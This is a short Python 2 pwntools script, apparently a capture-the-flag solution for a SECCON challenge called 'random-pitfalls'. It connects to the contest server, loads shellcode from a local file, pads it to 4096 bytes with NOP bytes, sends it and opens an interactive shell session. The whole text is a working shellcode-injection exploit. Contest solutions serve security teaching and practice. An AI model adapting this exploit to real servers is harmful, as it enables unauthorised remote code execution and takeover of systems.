#!/usr/bin/env python2

import pwn

# r = pwn.process('./server')
r = pwn.remote('random-pitfalls.chal.seccon.jp', 10101)
print r.recvuntil('\n')

shellcode = open('shell.bin', 'rb').read()

assert len(shellcode) < 4096
shellcode += '\x90' * (4096 - len(shellcode))
assert len(shellcode) == 4096

r.send(shellcode)
r.interactive()

